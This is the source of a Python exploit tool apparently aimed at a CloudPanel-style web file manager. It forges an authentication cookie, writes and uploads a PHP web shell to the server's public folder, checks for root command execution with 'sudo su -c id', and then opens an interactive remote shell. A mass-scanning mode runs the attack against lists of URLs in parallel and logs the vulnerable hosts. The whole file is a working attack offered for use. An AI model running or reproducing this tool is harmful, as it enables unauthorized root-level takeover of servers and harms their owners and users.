import os
import re
import urllib3
import argparse
import requests
import subprocess

from rich.console import Console
from urllib.parse import urlparse
from alive_progress import alive_bar
from prompt_toolkit import PromptSession
from prompt_toolkit.formatted_text import HTML
from prompt_toolkit.history import InMemoryHistory
from concurrent.futures import ThreadPoolExecutor, as_completed


class Exploiter:
    def __init__(self):
        self.console = Console()
        self.command = 'php Crypto.php'
        self.default_path = '/file-manager/'
        self.username = 'clp'
        self.output_file = None
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    def execute_remote_command(self, target, command):
        shell_url = f"{target}/shell.php?cmd={command}"
        try:
            response = requests.get(shell_url, verify=False, timeout=5)
            response.raise_for_status()

            content = response.text.strip()
            
            match = re.search(r'\[S\](.*?)\[E\]', content, re.DOTALL)
            if match:
                return match.group(1)

        except requests.RequestException:
            pass
        return None

    def interactive_shell(self, target):
        session = PromptSession(history=InMemoryHistory())
        self.console.print("[bold green][+] Entered Interactive Shell Mode. Type 'exit' or 'quit' to leave.[/bold green]\n")
        
        while True:
            try:
                command = session.prompt(HTML('<ansired><b># </b></ansired>'))
                if command.lower() in ["exit", "quit"]:
                    self.console.print("[bold yellow][!] Exiting shell...[/bold yellow]")
                    break
                elif "clear" in command:
                    os.system('clear') if os.name == 'posix' else os.system('cls')
                else:
                    output = self.execute_remote_command(target, command)
                    self.console.print(f"[bold yellow]{output}[/bold yellow]")
            except KeyboardInterrupt:
                self.console.print("[!] Exiting and deleting shell...")
                self.execute_remote_command(target, "rm -rf shell.php")
                break
            
    def execute_php(self, text=None):
        if text:
            process_command = (self.command + ' ' + text).split(' ')
        else:
            process_command = self.command.split(' ')
            
        with subprocess.Popen(process_command, stdout=subprocess.PIPE) as proc:
            return proc.stdout.read().decode('utf-8')
    
    def display_message(self, result, id_output):
        if result:
            self.console.print(
                    f"[bold red][+] Vulnerable URL: {result}[/bold red]\n"
                    f"[bold green][-] Extracted Output:[/bold green] " 
                    f"[bold yellow]{id_output}[/bold yellow]"
                )
            if self.output_file:
                with open(self.output_file, 'a') as f:
                    f.write(result + '\n')
                    
    def run_exploit(self, url):
        parsed_target = urlparse(url)

        if not parsed_target.scheme:
            if ':' in url:
                ip, port = url.split(':')
                constructed_target = f"https://{ip}:{port}"
            else:
                constructed_target = f"https://{url}"
        else:
            constructed_target = url

        crypto = self.execute_php()
        cookie = {'clp-fm': crypto}

        try:
            request = requests.get(constructed_target + self.default_path, cookies=cookie, verify=False, timeout=5)
            if request.status_code == 200:
                file_data = {'id': '/htdocs/app/files/public/', 'name': 'shell.php'}
                new_cookie = {'clp-fm': self.execute_php(self.username)}
                file_creation_request = requests.post(constructed_target + self.default_path + 'backend/makefile', cookies=new_cookie, data=file_data, verify=False, timeout=5)
                
                if file_creation_request.status_code == 200:
                    content_data = {'id': '/htdocs/app/files/public/shell.php', 'content': open('shell.php', 'rb').read()}
                    content_upload_request = requests.post(constructed_target + self.default_path + 'backend/text', cookies=new_cookie, data=content_data, verify=False, timeout=5)
                    
                    if content_upload_request.status_code == 200:
                        id_result = self.execute_remote_command(constructed_target, "sudo su -c id; rm -rf shell.php")
                        
                        if id_result:
                            return constructed_target, id_result
                
                    return None, None
        except:
            pass

        return None, None

    def start(self):
        parser = argparse.ArgumentParser()
        parser.add_argument('-u', '--url', dest='url', type=str, help='URL to test. Ex: 127.0.0.1:8443')
        parser.add_argument('-f', '--file', dest='file', type=str, help='File containing list of URLs to test.')
        parser.add_argument('-o', '--output', dest='output', type=str, help='Output file to write vulnerable URLs.')
        parser.add_argument('-t', '--threads', dest='threads', type=int, default=10, help='Number of threads for parallel execution. Default is 10.')
        args = parser.parse_args()

        if not args.url and not args.file:
            self.console.print("[!] You must provide either a URL with -u/--url or a file with -f/--file.")
            parser.print_help()
            return

        if args.output:
            self.output_file = args.output

        if args.url:
            result, id_output = self.run_exploit(args.url)
            self.display_message(result, id_output)
            if result:
                self.interactive_shell(result)
                
        elif args.file:
            urls_to_test = []
            with open(args.file, 'r') as f:
                urls_to_test.extend([line.strip() for line in f])

            with ThreadPoolExecutor(max_workers=args.threads) as executor:
                futures = [executor.submit(self.run_exploit, url) for url in urls_to_test]
                
                with alive_bar(len(urls_to_test)) as bar:
                    for future in as_completed(futures):
                        result, id_output = future.result()
                        self.display_message(result, id_output)
                        bar()

if __name__ == '__main__':
    exploiter_instance = Exploiter()
    exploiter_instance.start()